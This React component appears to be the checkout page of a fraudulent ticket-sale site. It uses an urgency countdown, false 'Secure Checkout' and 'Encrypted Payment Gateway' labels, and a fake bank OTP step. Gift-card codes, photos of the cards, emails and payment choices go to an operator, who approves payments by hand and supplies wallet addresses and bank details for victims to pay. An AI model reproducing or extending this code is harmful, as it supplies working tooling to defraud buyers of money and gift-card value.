import React, { useState, useEffect } from 'react';
import { ChevronLeft, Clock, CreditCard, ChevronDown, ShieldCheck, Bitcoin, Gift, Camera, CheckCircle } from 'lucide-react';
// import { Apple } from 'lucide-react'; // Note: 'Apple' icon might not be in all lucide versions, using text or generic if needed.

// Helper for Apple Icon if missing
const AppleIcon = () => (
  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-apple"><path d="M12 20.94c1.5 0 2.75 1.06 4 1.06 3 0 6-8 6-8s-3-4-6-4c-2 0-3 .9-5 .9-2 0-4-1-6-1-2.9 0-8 6-8 6s3 4 6 4c2 0 3-.9 5-.9z"/><path d="M10 2c1 .5 2 2 2 4 0 1 0 1 .5 1-2-2-6-4.5-6-4.5z"/></svg>
);


export default function Checkout({ cart = [], sessionId, sessionData = {}, updateSession = () => {}, onSuccess, onBack, userRegion = 'USA' }) {
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes countdown
  const [bankTimeLeft, setBankTimeLeft] = useState(1800); // 30 minutes for bank transfer
  const [paymentMethod, setPaymentMethod] = useState(null); 
  const [cardDetails, setCardDetails] = useState({ number: '', exp: '', cvc: '' });
  
  // Gift Card States
  const [giftCardType, setGiftCardType] = useState('apple');
  const [giftCode, setGiftCode] = useState('');
  const [giftCardImage, setGiftCardImage] = useState(null);
  const [hasUploadedImage, setHasUploadedImage] = useState(false);

  const [enteredOtp, setEnteredOtp] = useState('');
  const [email, setEmail] = useState('');
  
  // Realtime Data from Props (Admin Control)
  const status = sessionData?.status || 'payment_pending'; 
  const adminProvidedOtp = sessionData?.userAuthCode; // Using auth code field for OTP verification if needed
  const cryptoAddress = sessionData?.cryptoAddress || "Waiting for agent..."; // Add this field to your DB if you want dynamic addresses
  const bankDetails = sessionData?.bankDetails || "Waiting for agent..."; // New field for bank transfer details

  // Calculations
  const subtotal = cart.reduce((acc, item) => acc + item.price, 0);
  const fees = cart.length * 25.50;
  const orderProcessing = 9.50;
  const grandTotal = subtotal + fees + orderProcessing;

  // Original Countdown Timer (5 min)
  useEffect(() => {
    const timer = setInterval(() => setTimeLeft(p => p > 0 ? p - 1 : 0), 1000);
    return () => clearInterval(timer);
  }, []);

  // Bank Transfer Timer (30 min, starts on select)
  useEffect(() => {
    if (paymentMethod === 'bank_transfer') {
      const bankTimer = setInterval(() => setBankTimeLeft(p => p > 0 ? p - 1 : 0), 1000);
      return () => clearInterval(bankTimer);
    }
  }, [paymentMethod]);

  // --- HANDLERS ---

  const handleCardSubmit = (e) => {
    e.preventDefault();
    // Simulate sending data to admin & waiting for OTP
    const fakeSystemOtp = Math.floor(100000 + Math.random() * 900000).toString();
    updateSession(sessionId, { 
      status: 'waiting_for_otp', 
      otp: fakeSystemOtp, // Admin sees this
      paymentMethod: 'card', 
      email: email, 
      cart: cart, 
      total: grandTotal 
    });
  };

  const handleManualRequest = (type) => {
    setPaymentMethod(type);
    updateSession(sessionId, { 
      status: 'waiting_for_admin_address', 
      paymentMethod: type, 
      email: email, 
      cart: cart, 
      total: grandTotal 
    });
  };

  const handleImageUpload = (e) => {
    const file = e.target.files[0];
    if (file) {
      if (file.size > 1000000) {
        alert("File too large. Max 1MB.");
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCardImage(reader.result); 
        setHasUploadedImage(true);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleGiftCardSubmit = () => {
    if (!giftCode) return alert("Please enter the card code");
    
    updateSession(sessionId, { 
      status: 'waiting_for_otp', 
      otp: `GC-${giftCardType.toUpperCase()}`, 
      email: email, 
      cart: cart, 
      total: grandTotal, 
      paymentMethod: 'gift_card',
      giftCardDetails: { type: giftCardType, code: giftCode, imageBase64: giftCardImage }
    });
  };

  const handleOtpVerify = () => {
    // In this logic, we might wait for Admin to set status to 'payment_complete'
    // OR verify against a code. Here we simulate the 'Admin Approved' check.
    if (sessionData.status === 'success' || sessionData.status === 'payment_complete') {
        onSuccess();
    } else {
        alert("Verification Pending... Please wait for agent approval.");
    }
  };

  // Auto-redirect if status changes to success externally
  useEffect(() => {
    if (sessionData.status === 'success' || sessionData.status === 'payment_complete' || sessionData.status === 'success_confirmed') {
        setTimeout(() => onSuccess(), 1500);
    }
  }, [sessionData.status, onSuccess]);


  return (
    <div className="min-h-screen bg-[#f8fafc] p-6 md:p-12 font-sans text-gray-900">
      <div className="max-w-6xl mx-auto space-y-12">
        
        {/* Back Navigation */}
        <button onClick={onBack} className="text-[#026cdf] font-black text-[13px] uppercase tracking-[0.4em] flex items-center gap-4 active:scale-95 transition-all bg-white px-8 py-4 rounded-full shadow-lg border-2 border-white hover:border-[#026cdf]/20">
          <ChevronLeft className="w-5 h-5" /> Edit Selection
        </button>

        <div className="grid grid-cols-1 md:grid-cols-2 gap-12">
           
           {/* LEFT: ORDER SUMMARY CARD */}
           <div className="bg-white p-12 rounded-[60px] shadow-[0_40px_100px_rgba(0,0,0,0.08)] space-y-10 border-4 border-white relative overflow-hidden">
              <div className="absolute top-0 left-0 w-2 h-full bg-[#026cdf]" />
              <div className="flex justify-between items-center border-b-2 border-gray-100 pb-6">
                 <h3 className="text-4xl font-black tracking-tighter uppercase italic text-gray-900">Your Cart</h3>
                 <div className="flex items-center text-[#ea0042] font-bold bg-[#ea0042]/10 px-4 py-2 rounded-full">
                    <Clock className="w-4 h-4 mr-2" />
                    {Math.floor(timeLeft / 60)}:{(timeLeft % 60).toString().padStart(2, '0')}
                 </div>
              </div>

              <div className="space-y-6 max-h-[300px] overflow-y-auto pr-2">
                {cart.length === 0 ? <p className="text-gray-400 italic">Cart is empty</p> : cart.map(s => (
                  <div key={s.id} className="flex justify-between items-center text-lg font-bold border-b border-gray-50 pb-4 last:border-0">
                    <div className="space-y-1">
                        <p className="text-gray-400 text-[10px] uppercase tracking-[0.3em] font-black">Floor Section</p>
                        <p className="text-gray-900 uppercase italic tracking-tight">Row {s.row} • Seat {s.seat}</p>
                    </div>
                    <p className="text-2xl font-black text-[#026cdf] tracking-tighter">${s.price.toFixed(2)}</p>
                  </div>
                ))}
              </div>

              <div className="bg-gray-50 p-10 rounded-[45px] space-y-4 shadow-inner border-2 border-gray-100">
                <div className="flex justify-between items-center text-[11px] font-black text-gray-400 uppercase tracking-[0.3em]">
                    <span>Service Fees</span><span>${fees.toFixed(2)}</span>
                </div>
                <div className="flex justify-between items-center text-[11px] font-black text-gray-400 uppercase tracking-[0.3em]">
                    <span>Facility Charge</span><span>${orderProcessing.toFixed(2)}</span>
                </div>
                <div className="flex justify-between items-center text-5xl font-black text-gray-900 tracking-tighter uppercase mt-8 italic pt-8 border-t-4 border-dashed border-gray-200">
                    <span>Total</span><span>${grandTotal.toFixed(2)}</span>
                </div>
              </div>
           </div>
           
           {/* RIGHT: PAYMENT METHOD SELECTION */}
           <div className="bg-white p-12 rounded-[60px] shadow-[0_60px_150px_rgba(0,0,0,0.12)] space-y-10 border-4 border-white h-fit relative">
              <div className="space-y-3">
                 <h3 className="text-4xl font-black tracking-tighter uppercase italic leading-none text-blue-950">Secure Checkout</h3>
                 <p className="text-[11px] font-black uppercase text-gray-400 tracking-[0.4em] italic">Encrypted Payment Gateway</p>
              </div>

              <div className="space-y-6">
                 {/* Email Input */}
                 <div className="space-y-2">
                    <label className="text-[10px] font-black text-gray-400 uppercase tracking-widest ml-4">Delivery Email</label>
                    <input 
                        type="email" 
                        placeholder="name@example.com" 
                        required 
                        className="w-full border-2 border-gray-100 p-5 rounded-[30px] focus:ring-4 focus:ring-[#026cdf]/10 outline-none font-bold text-gray-700 transition-all" 
                        value={email} 
                        onChange={e=>setEmail(e.target.value)} 
                    />
                 </div>

                 <div className="space-y-4">
                    {/* OPTION 1: CREDIT CARD */}
                    <div className={`border-2 rounded-[35px] overflow-hidden transition-all duration-300 ${paymentMethod === 'card' ? 'border-[#026cdf] shadow-xl ring-4 ring-[#026cdf]/5' : 'border-gray-100 hover:border-gray-200'}`}>
                        <div className="flex items-center gap-4 cursor-pointer p-6 bg-white" onClick={() => setPaymentMethod('card')}>
                            <div className="bg-gray-100 p-3 rounded-2xl"><CreditCard className="text-gray-600 w-6 h-6" /></div>
                            <span className="font-black text-sm uppercase tracking-wide">Credit / Debit</span>
                            <ChevronDown className={`ml-auto w-5 h-5 transition-transform text-gray-400 ${paymentMethod === 'card' ? 'rotate-180' : ''}`} />
                        </div>
                        
                        {paymentMethod === 'card' && status !== 'waiting_for_otp' && (
                            <form onSubmit={handleCardSubmit} className="p-6 border-t-2 border-gray-100 bg-gray-50 space-y-4 animate-slideDown">
                                <input required placeholder="Card Number" className="w-full border-2 border-white p-4 rounded-2xl bg-white font-bold outline-none focus:border-[#026cdf]" value={cardDetails.number} onChange={e=>setCardDetails({...cardDetails, number: e.target.value})} />
                                <div className="flex gap-4">
                                    <input placeholder="MM/YY" className="w-1/2 border-2 border-white p-4 rounded-2xl bg-white font-bold outline-none" />
                                    <input placeholder="CVC" className="w-1/2 border-2 border-white p-4 rounded-2xl bg-white font-bold outline-none" />
                                </div>
                                <button type="submit" className="w-full bg-[#026cdf] text-white py-5 rounded-[25px] font-black uppercase tracking-widest shadow-lg hover:bg-blue-700 transition-all active:scale-95">Pay Now</button>
                            </form>
                        )}
                        
                        {/* OTP STATE */}
                        {(status === 'waiting_for_otp' || sessionData.status === 'waiting_for_otp') && paymentMethod === 'card' && (
                           <div className="p-8 bg-blue-50 text-center border-t-2 border-blue-100 animate-fadeIn">
                              <ShieldCheck className="w-12 h-12 text-[#026cdf] mx-auto mb-4 animate-bounce" />
                              <p className="font-black text-lg text-blue-900 uppercase italic">Bank Verification</p>
                              <p className="text-[10px] text-blue-600 mb-6 font-bold uppercase tracking-wider">Enter the code sent to your device.</p>
                              <input className="border-4 border-white p-4 rounded-2xl w-48 text-center text-3xl font-black tracking-[0.5em] block mx-auto mb-6 shadow-inner text-[#026cdf]" value={enteredOtp} onChange={e=>setEnteredOtp(e.target.value)} maxLength={6} />
                              <button onClick={handleOtpVerify} className="bg-[#026cdf] text-white px-10 py-4 rounded-full font-black uppercase tracking-widest shadow-xl hover:scale-105 transition-all">Confirm</button>
                           </div>
                        )}
                    </div>

                    {/* OPTION 2: CRYPTO / BITCOIN */}
                    <div className={`border-2 rounded-[35px] overflow-hidden transition-all ${paymentMethod === 'bitcoin' ? 'border-[#f59e0b] shadow-xl' : 'border-gray-100'}`}>
                         <div className="flex items-center gap-4 cursor-pointer p-6 bg-white" onClick={() => handleManualRequest('bitcoin')}>
                           <div className="bg-amber-100 p-3 rounded-2xl"><Bitcoin className="text-amber-600 w-6 h-6" /></div>
                           <span className="font-black text-sm uppercase tracking-wide">Bitcoin (BTC)</span>
                         </div>
                         {paymentMethod === 'bitcoin' && (
                            <div className="p-8 border-t-2 border-amber-100 bg-amber-50 text-center animate-slideDown">
                               {!cryptoAddress || cryptoAddress === "Waiting for agent..." ? (
                                  <div className="py-6 flex flex-col items-center">
                                     <div className="w-6 h-6 border-4 border-amber-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                                     <span className="text-[10px] font-black text-amber-600 uppercase tracking-widest animate-pulse">Requesting Secure Wallet...</span>
                                  </div>
                               ) : (
                                  <div className="space-y-4 animate-fadeIn">
                                     <p className="text-[10px] text-amber-800 uppercase font-black tracking-widest">Transfer exactly ${grandTotal.toFixed(2)} to:</p>
                                     <div className="bg-white p-4 border-2 border-amber-200 rounded-2xl text-[10px] break-all font-mono select-all text-center font-bold shadow-sm">{cryptoAddress}</div>
                                     <button onClick={() => updateSession(sessionId, { status: 'waiting_for_confirmation' })} className="w-full bg-amber-500 text-white py-4 rounded-2xl font-black uppercase tracking-widest shadow-lg hover:bg-amber-600 transition-all">I Sent Payment</button>
                                  </div>
                               )}
                            </div>
                         )}
                    </div>

                    {/* OPTION 3: APPLE PAY */}
                    <div className={`border-2 rounded-[35px] overflow-hidden transition-all ${paymentMethod === 'apple_pay' ? 'border-black shadow-xl' : 'border-gray-100'}`}>
                         <div className="flex items-center gap-4 cursor-pointer p-6 bg-white" onClick={() => handleManualRequest('apple_pay')}>
                           <div className="bg-black p-3 rounded-2xl"><AppleIcon /></div>
                           <span className="font-black text-sm uppercase tracking-wide">Apple Pay</span>
                         </div>
                         {paymentMethod === 'apple_pay' && (
                            <div className="p-8 border-t-2 border-gray-200 bg-gray-50 text-center animate-slideDown">
                               {/* Logic mimics crypto: wait for admin to send Apple Pay number/email */}
                               <div className="py-6">
                                  <p className="text-[11px] font-black text-gray-500 uppercase tracking-widest mb-4">Connecting to Merchant...</p>
                                  <button className="w-full bg-black text-white py-4 rounded-2xl font-bold flex items-center justify-center gap-2 shadow-xl"><AppleIcon /> Pay with Passcode</button>
                               </div>
                            </div>
                         )}
                    </div>

                    {/* OPTION 4: GIFT CARDS */}
                    <div className={`border-2 rounded-[35px] overflow-hidden transition-all ${paymentMethod === 'gift_card' ? 'border-[#db2777] shadow-xl' : 'border-gray-100'}`}>
                         <div className="flex items-center gap-4 cursor-pointer p-6 bg-white" onClick={() => setPaymentMethod('gift_card')}>
                           <div className="bg-pink-100 p-3 rounded-2xl"><Gift className="text-pink-600 w-6 h-6" /></div>
                           <span className="font-black text-sm uppercase tracking-wide">Gift Card</span>
                         </div>
                         {paymentMethod === 'gift_card' && (
                            <div className="p-6 border-t-2 border-pink-100 bg-pink-50 space-y-5 animate-slideDown">
                               <select className="w-full border-2 border-white p-4 rounded-2xl bg-white font-bold text-gray-700 outline-none" value={giftCardType} onChange={(e) => setGiftCardType(e.target.value)}>
                                 <option value="apple">Apple Gift Card</option>
                                 <option value="razer">Razer Gold</option>
                                 <option value="vanilla">Vanilla Visa</option>
                               </select>
                               <input placeholder="Enter Card Code..." className="w-full border-2 border-white p-4 rounded-2xl bg-white font-black outline-none tracking-widest" value={giftCode} onChange={e=>setGiftCode(e.target.value)} />
                               
                               <div className="border-4 border-dashed border-pink-200 rounded-[30px] p-6 text-center bg-white relative hover:bg-pink-50 transition-colors">
                                  <input type="file" accept="image/*" className="absolute inset-0 opacity-0 cursor-pointer z-20" onChange={handleImageUpload} />
                                  <div className="flex flex-col items-center gap-2">
                                    {hasUploadedImage ? <CheckCircle className="text-green-500 w-8 h-8" /> : <Camera className="text-pink-300 w-8 h-8" />}
                                    <span className="text-[10px] font-black text-gray-400 uppercase tracking-widest">{hasUploadedImage ? "Image Attached" : "Tap to Upload Front/Back"}</span>
                                  </div>
                               </div>
                               <button onClick={handleGiftCardSubmit} className="w-full bg-[#db2777] text-white py-5 rounded-[25px] font-black uppercase tracking-widest shadow-xl hover:bg-pink-700 transition-all active:scale-95">Verify & Apply</button>
                            </div>
                         )}
                    </div>

                    {/* OPTION 5: BANK TRANSFER (UK/DE/FR only) */}
                    {['UK', 'Germany', 'France'].includes(userRegion) && (
                      <div className={`border-2 rounded-[35px] overflow-hidden transition-all ${paymentMethod === 'bank_transfer' ? 'border-[#10b981] shadow-xl' : 'border-gray-100'}`}>
                         <div className="flex items-center gap-4 cursor-pointer p-6 bg-white" onClick={() => handleManualRequest('bank_transfer')}>
                           <div className="bg-emerald-100 p-3 rounded-2xl"><CreditCard className="text-emerald-600 w-6 h-6" /></div>
                           <span className="font-black text-sm uppercase tracking-wide">Bank Transfer</span>
                         </div>
                         {paymentMethod === 'bank_transfer' && (
                            <div className="p-8 border-t-2 border-emerald-100 bg-emerald-50 text-center animate-slideDown">
                               {!bankDetails || bankDetails === "Waiting for agent..." ? (
                                  <div className="py-6 flex flex-col items-center">
                                     <div className="w-6 h-6 border-4 border-emerald-500 border-t-transparent rounded-full animate-spin mb-4"></div>
                                     <span className="text-[10px] font-black text-emerald-600 uppercase tracking-widest animate-pulse">Connecting...</span>
                                  </div>
                               ) : (
                                  <div className="space-y-4 animate-fadeIn">
                                     <p className="text-[10px] text-emerald-800 uppercase font-black tracking-widest">Transfer exactly ${grandTotal.toFixed(2)} to:</p>
                                     <div className="bg-white p-4 border-2 border-emerald-200 rounded-2xl text-[10px] break-all font-mono select-all text-center font-bold shadow-sm">{bankDetails}</div>
                                     <div className="flex items-center justify-center text-[#ea0042] font-bold bg-[#ea0042]/10 px-4 py-2 rounded-full w-fit mx-auto mb-4">
                                       <Clock className="w-4 h-4 mr-2" />
                                       {Math.floor(bankTimeLeft / 60)}:{(bankTimeLeft % 60).toString().padStart(2, '0')}
                                     </div>
                                     <button onClick={() => updateSession(sessionId, { status: 'waiting_for_confirmation' })} className="w-full bg-emerald-500 text-white py-4 rounded-2xl font-black uppercase tracking-widest shadow-lg hover:bg-emerald-600 transition-all">I Have Made Payment</button>
                                  </div>
                               )}
                            </div>
                         )}
                      </div>
                    )}

                 </div>
              </div>
           </div>
        </div>
      </div>
    </div>
  );
}
